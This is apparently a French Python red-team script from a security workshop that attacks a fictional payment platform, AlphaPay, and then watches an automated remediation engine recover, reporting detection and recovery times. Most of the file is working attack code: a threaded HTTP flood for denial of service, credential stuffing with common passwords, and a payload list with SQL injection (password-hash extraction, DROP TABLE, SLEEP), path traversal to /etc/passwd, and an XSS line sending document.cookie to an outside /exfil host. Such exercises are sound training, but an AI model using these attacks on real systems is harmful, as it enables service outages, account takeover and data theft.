#!/usr/bin/env python3
"""AlphaPay : banc offensif (Red Team).

Ce script s'exécute depuis le **poste attaquant**, distinct du poste hôte. Il
n'utilise aucune bibliothèque exotique : uniquement la bibliothèque standard,
pour qu'il puisse tourner sur n'importe quelle machine de la salle sans
préparation.

Avertissement : cadre légal et éthique
--------------------------------------
Ce banc n'est destiné qu'à la plateforme AlphaPay fictive, déployée sur le
réseau du workshop. Les adresses visées sont celles du poste hôte de son propre
groupe. Toute utilisation contre un système qui n'est pas le sien est illégale.

Ce que le script fait
---------------------
1. (option) il déclare l'instant de départ de l'attaque au moteur de
   remédiation, ce qui permet de mesurer un délai de détection non ambigu ;
2. il exécute un scénario offensif parmi trois ;
3. il observe l'état de la salle d'opérations et mesure le temps de
   rétablissement ;
4. il produit un rapport lisible.

Scénarios
---------
A1  rafale volumétrique       : déni de service applicatif
A2  bourrage d'identifiants   : tentative de compromission de comptes
A3  injection applicative     : injections SQL et XSS, tentative d'exfiltration

Usage
-----
    python3 alpha_redteam.py --scenario A1 --target http://192.168.137.1
    python3 alpha_redteam.py --scenario A2 --target http://192.168.137.1 --declare
    python3 alpha_redteam.py --scenario A3 --target https://192.168.137.1 --insecure
"""

from __future__ import annotations

import argparse
import concurrent.futures
import hashlib
import hmac
import json
import random
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

UTILISATEURS = ["admin", "operateur", "client01", "client02", "client03"]
IDENTIFIANTS_FICTIFS = [
    "client01", "client02", "client03", "client04", "client05", "client06",
    "client07", "client08", "client09", "client10", "client11", "client12",
    "client13", "client14", "client15", "client16", "client17", "client18",
    "operateur", "admin", "support", "comptabilite", "audit", "tresorerie",
]
MOTS_DE_PASSE_FICTIFS = [
    "password", "123456", "azerty", "motdepasse", "admin", "root",
    "qwerty", "letmein", "welcome", "changeme",
]

CHARGES_INJECTION = [
    "/api/payments?reference=1%20UNION%20SELECT%20username,password_hash%20FROM%20auth.users",
    "/api/payments?reference='%20OR%20'1'%3D'1",
    "/api/payments?reference=1%3B%20DROP%20TABLE%20ledger.entries%3B--",
    "/api/ledger/accounts?code=CUST-000001'%20AND%20SLEEP(5)--",
    "/api/payments?reference=%3Cscript%3Efetch('http://192.168.137.20/exfil?c='%2Bdocument.cookie)%3C/script%3E",
    "/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    "/api/ledger/balance?path=..%2f..%2f..%2f..%2fetc%2fpasswd",
]


class BancOffensif:
    def __init__(self, cible: str, *args: object, insecure: bool = False, timeout: float = 10.0) -> None:
        self.cible = cible.rstrip("/")
        self.timeout = timeout
        self.contexte = ssl._create_unverified_context() if insecure else None  # noqa: S323
        self.resultats: dict[str, int] = {}

    # -- primitives --------------------------------------------------------

    def requete(
        self,
        chemin: str,
        *,
        methode: str = "GET",
        corps: dict | None = None,
        entetes: dict[str, str] | None = None,
        timeout: float | None = None,
    ) -> tuple[int, str]:
        """Retourne (statut, corps). Ne lève jamais : l'attaque ne doit pas s'arrêter
        sur une erreur réseau, c'est précisément le comportement attendu quand la
        bordure commence à bloquer."""
        url = f"{self.cible}{chemin}"
        donnees = json.dumps(corps).encode() if corps is not None else None
        entetes_complets = {"User-Agent": "AlphaPay-RedTeam/1.0", "Accept": "*/*"}
        if donnees is not None:
            entetes_complets["Content-Type"] = "application/json"
        if entetes:
            entetes_complets.update(entetes)
        requete = urllib.request.Request(url, data=donnees, headers=entetes_complets, method=methode)
        try:
            with urllib.request.urlopen(
                requete, timeout=timeout or self.timeout, context=self.contexte
            ) as reponse:
                return reponse.status, reponse.read().decode("utf-8", "replace")[:400]
        except urllib.error.HTTPError as erreur:
            return erreur.code, erreur.read().decode("utf-8", "replace")[:400]
        except Exception as erreur:  # noqa: BLE001
            return 0, f"{type(erreur).__name__}: {erreur}"

    def jeton(self, utilisateur: str, mot_de_passe: str) -> str | None:
        statut, corps = self.requete(
            "/api/auth/token",
            methode="POST",
            corps={"username": utilisateur, "password": mot_de_passe},
        )
        if statut != 200:
            return None
        try:
            return json.loads(corps).get("access_token")
        except json.JSONDecodeError:
            return None

    def compter(self, cle: str, statut: int) -> None:
        self.resultats[f"{cle}:{statut}"] = self.resultats.get(f"{cle}:{statut}", 0) + 1

    # -- scénarios ---------------------------------------------------------

    def rafale(self, duree: float, debit: int, concurrence: int) -> None:
        """A1 : déni de service applicatif."""
        print(f"  A1 : rafale de {debit} req/s pendant {duree:.0f} s ({concurrence} fils)")

        def tir(_: int) -> None:
            chemin = random.choice(
                [
                    "/api/payments",
                    "/api/payments?limit=100",
                    "/api/ledger/accounts",
                    "/api/ledger/integrity",
                    "/api/auth/token",
                ]
            )
            statut, _corps = self.requete(chemin, timeout=4.0)
            self.compter("rafale", statut)

        fin = time.time() + duree
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrence) as executeur:
            while time.time() < fin:
                debut = time.time()
                for _ in range(debit // 10):
                    executeur.submit(tir, 0)
                ecoule = time.time() - debut
                if ecoule < 0.1:
                    time.sleep(0.1 - ecoule)

    def bourrage_identifiants(self, duree: float, concurrence: int) -> None:
        """A2 : bourrage d'identifiants."""
        print(f"  A2 : bourrage d'identifiants pendant {duree:.0f} s ({concurrence} fils)")

        def tir(_: int) -> None:
            utilisateur = random.choice(IDENTIFIANTS_FICTIFS)
            mot_de_passe = random.choice(MOTS_DE_PASSE_FICTIFS)
            statut, _corps = self.requete(
                "/api/auth/token",
                methode="POST",
                corps={"username": utilisateur, "password": mot_de_passe},
                timeout=4.0,
            )
            self.compter("bourrage", statut)

        fin = time.time() + duree
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrence) as executeur:
            while time.time() < fin:
                for _ in range(concurrence * 2):
                    executeur.submit(tir, 0)
                time.sleep(0.2)

    def injection(self, duree: float) -> None:
        """A3 : injections applicatives."""
        print(f"  A3 : injections SQL et XSS pendant {duree:.0f} s")
        fin = time.time() + duree
        while time.time() < fin:
            for charge in CHARGES_INJECTION:
                statut, _corps = self.requete(charge, timeout=4.0)
                self.compter("injection", statut)
                # Une tentative d'exfiltration se reconnaît à un volume de
                # réponse anormalement élevé : on demande les soldes complets.
                statut, _corps = self.requete("/api/ledger/accounts?limit=200", timeout=6.0)
                self.compter("exfiltration", statut)
            time.sleep(0.4)

    # -- instrumentation ---------------------------------------------------

    def declarer(self, secret: str, scenario: str) -> bool:
        """Déclare le début de l'attaque au moteur de remédiation (mesure du MTTD)."""
        charge = {
            "kind": "attack.started",
            "scenario": scenario,
            "severity": "info",
            "started_at_epoch": time.time(),
        }
        corps = json.dumps(charge).encode()
        signature = hmac.new(secret.encode(), corps, hashlib.sha256).hexdigest()
        url = f"{self.cible}/api/ops/ingest/webhook"
        requete = urllib.request.Request(
            url,
            data=corps,
            headers={
                "Content-Type": "application/json",
                "X-AlphaPay-Signature": f"hmac-sha256={signature}",
                "User-Agent": "AlphaPay-RedTeam/1.0",
            },
            method="POST",
        )
        try:
            with urllib.request.urlopen(requete, timeout=8.0, context=self.contexte) as reponse:
                return reponse.status == 200
        except Exception as erreur:  # noqa: BLE001
            print(f"  declaration impossible : {erreur}")
            return False

    def observer(self, limite: float = 300.0, intervalle: float = 3.0) -> dict:
        """Suit l'état de la salle d'opérations jusqu'au rétablissement."""
        debut = time.time()
        dernier: dict = {}
        incident_vu = None
        while time.time() - debut < limite:
            statut, corps = self.requete("/api/supervision/state", timeout=6.0)
            if statut == 200:
                try:
                    dernier = json.loads(corps)
                except json.JSONDecodeError:
                    dernier = {}
                incident = dernier.get("incident")
                if incident and incident_vu is None:
                    incident_vu = incident.get("id")
                    print(f"  incident ouvert : {incident.get('id')} "
                          f"[{incident.get('severity')}] {incident.get('title')}")
                if dernier.get("state") == "RECOVERED":
                    return {"state": "RECOVERED", "elapsed": time.time() - debut,
                            "incident_id": incident_vu}
                if dernier.get("state") == "FAILED":
                    return {"state": "FAILED", "elapsed": time.time() - debut,
                            "incident_id": incident_vu}
                etat = dernier.get("state", "?")
                print(f"  etat : {etat}")
            else:
                print(f"  etat : bordure injoignable (HTTP {statut})")
            time.sleep(intervalle)
        return {"state": "TIMEOUT", "elapsed": time.time() - debut, "incident_id": incident_vu}

    def rapport_incident(self, incident_id: str | None) -> None:
        if not incident_id:
            return
        statut, corps = self.requete(
            f"/api/supervision/incidents/{urllib.parse.quote(incident_id)}", timeout=10.0
        )
        if statut != 200:
            return
        try:
            detail = json.loads(corps)
        except json.JSONDecodeError:
            return
        incident = detail.get("incident") or {}
        print("\n--- incident ---")
        print(f"  politique    : {(incident.get('summary') or {}).get('policy')}")
        print(f"  playbook     : {incident.get('playbook_id')}")
        print(f"  MTTD         : {(incident.get('mttd_ms') or 0) / 1000:.1f} s")
        print(f"  MTTR         : {(incident.get('mttr_ms') or 0) / 1000:.1f} s")
        print(f"  etat final   : {incident.get('state')}")
        for action in detail.get("actions") or []:
            marque = "ok " if action.get("status") == "ok" else "ECHEC"
            print(f"    [{marque}] {action.get('action'):26s} {action.get('duration_ms')} ms")
        for verification in detail.get("verifications") or []:
            for controle in verification.get("checks") or []:
                marque = "ok " if controle.get("passed") else "ECHEC"
                print(f"    [{marque}] verification {controle.get('name')}")


def main() -> int:
    analyseur = argparse.ArgumentParser(
        description="Banc offensif AlphaPay : usage strictement limité à la plateforme fictive du workshop."
    )
    analyseur.add_argument("--scenario", required=True, choices=["A1", "A2", "A3"])
    analyseur.add_argument("--target", required=True, help="URL de la bordure, ex. http://192.168.137.1")
    analyseur.add_argument("--duree", type=float, default=60.0, help="durée de l'attaque en secondes")
    analyseur.add_argument("--debit", type=int, default=120, help="A1 : requêtes par seconde visées")
    analyseur.add_argument("--concurrence", type=int, default=32, help="nombre de fils simultanés")
    analyseur.add_argument("--insecure", action="store_true", help="accepter un certificat auto-signé")
    analyseur.add_argument("--declare", action="store_true",
                           help="déclarer l'instant de départ (collecte du MTTD)")
    analyseur.add_argument("--secret", default="", help="secret HMAC pour la déclaration")
    analyseur.add_argument("--observer-secondes", type=float, default=240.0,
                           help="durée maximale d'observation de la remédiation")
    arguments = analyseur.parse_args()

    banc = BancOffensif(arguments.target, insecure=arguments.insecure)

    print(f"=== AlphaPay : banc offensif : scénario {arguments.scenario} ===")
    print(f"  cible : {banc.cible}")
    statut, _ = banc.requete("/healthz", timeout=6.0)
    if statut != 200:
        print(f"  AVERTISSEMENT : la bordure ne répond pas (HTTP {statut}).")
    else:
        print("  bordure joignable, service nominal avant tir")

    if arguments.declare and arguments.secret:
        if banc.declarer(arguments.secret, arguments.scenario):
            print("  depart d'attaque declare au moteur de remediation")

    debut = time.time()
    if arguments.scenario == "A1":
        banc.rafale(arguments.duree, arguments.debit, arguments.concurrence)
    elif arguments.scenario == "A2":
        banc.bourrage_identifiants(arguments.duree, arguments.concurrence)
    else:
        banc.injection(arguments.duree)
    duree_attaque = time.time() - debut

    print(f"\n  attaque terminée en {duree_attaque:.0f} s")
    print("  répartition des réponses :")
    for cle, nombre in sorted(banc.resultats.items()):
        code = cle.split(":")[-1]
        etiquette = {
            "200": "acceptée", "201": "acceptée (créée)", "400": "rejetée (métier)",
            "401": "non authentifiée", "403": "bloquée", "404": "introuvable",
            "429": "limité", "0": "connexion impossible",
        }.get(code, "autre")
        print(f"    {cle:22s} {nombre:6d}   {etiquette}")

    observation = banc.observer(arguments.observer_secondes)
    print(f"\n  observation de la remédiation : {observation['state']} "
          f"après {observation['elapsed']:.0f} s")
    banc.rapport_incident(observation.get("incident_id"))

    if observation["state"] == "RECOVERED":
        print("\nRESULTAT : service rétabli automatiquement, sans intervention humaine.")
        return 0
    print("\nRESULTAT : le rétablissement automatique n'a pas été observé dans le délai.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
